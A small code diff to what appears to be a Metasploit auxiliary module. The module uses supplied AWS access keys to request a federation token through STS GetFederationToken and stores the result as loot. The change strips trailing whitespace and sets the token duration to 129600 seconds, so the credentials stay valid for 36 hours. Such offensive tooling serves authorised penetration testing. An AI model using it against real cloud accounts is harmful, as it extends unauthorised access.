@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Auxiliary
 
 
   def run
-    print_status("Generating fed token")    
+    print_status("Generating fed token")
     # setup creds for making IAM API calls
     creds = {
       'AccessKeyId' => datastore['AccessKeyId'],
@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
     }
     creds['Token'] = datastore['Token'] unless datastore['Token'].blank?
     action = 'GetFederationToken'
-    doc = call_sts(creds, 'Action' => action, 'Name' => datastore['CONSOLE_NAME'], 'Policy' => URI.encode(datastore['IAM_POLICY']))
+    doc = call_sts(creds, 'Action' => action, 'Name' => datastore['CONSOLE_NAME'], 'Policy' => URI.encode(datastore['IAM_POLICY']), 'DurationSeconds' => '129600')
     doc = print_results(doc, action)
     return if doc.nil?
     path = store_loot(datastore['AccessKeyId'], 'text/plain', datastore['RHOST'], doc.to_json)
